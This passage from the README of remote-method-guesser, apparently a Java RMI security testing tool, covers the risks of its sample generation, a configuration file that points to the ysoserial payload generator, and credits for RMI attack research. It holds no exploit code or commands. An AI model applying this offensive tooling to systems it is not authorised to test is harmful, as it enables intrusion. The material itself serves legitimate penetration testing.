and that the different placeholders are usually required to guarantee this.

As automatically generated sample files contain content that is controlled by the remote server (*bound names*, *class names* and *package names*),
it is generally a security risk to compile and execute them. *remote-method-guesser* tries to reduce the risk by applying input filtering to
the above mentioned components. In some situations, this can be annoying. Especially *bound names* can contain a wide range of different characters
and most of them are rejected by *rmg* (this is because a whitelist filtering is used, instead of a blacklist). After you reviewed the *bound names*
and corresponding *remote classes* by using *rmg's* ``enum`` action, you may use the ``--trusted`` switch to disable input filtering during
sample generation. However, this should only be done after verifying that the remote server does not expose any malicious contents within its
*bound names* or *remote class names*.


### Configuration

-----

*remote-method-guesser* provides some command line switches to modify its behavior dynamically, but persistent configuration changes
are also possible for some options. *rmg* uses a [configuration file](./src/config.properties) to obtain default values for certain options,
but it also accepts a different configuration file passed using the ``--config`` option. The current default configuration looks like this:

```properties
template-folder  =
wordlist-folder  =
sample-folder    = ./rmg-samples
wordlist-file    =
ysoserial-path   = /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar
threads = 5
```

For persistent configuration changes, just apply them to the ``./src/config.properties`` file and rebuild *rmg* as explained [above](#installation).
You can also create a ``.properties`` file with your own configuration and feed it into *rmg* using the ``--config`` option.


### Acknowledgements

----

*remote-method-guesser* was heavily influenced by the blog posts of [Hans-Martin Münch](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
and [Jake Miller](https://labs.bishopfox.com/tech-blog/rmiscout). Furthermore, the [rmiscout wordlist](./wordlists/rmiscout.txt) was obviously copied from the [rmiscout](https://github.com/BishopFox/rmiscout)
project (as you can already tell by the different license agreement). Thanks *Jake*, for this awesome wordlist of *remote methods* collected from different *GitHub* repositories.

*Copyright 2021, Tobias Neitzel and the remote-method-guesser contributors.*
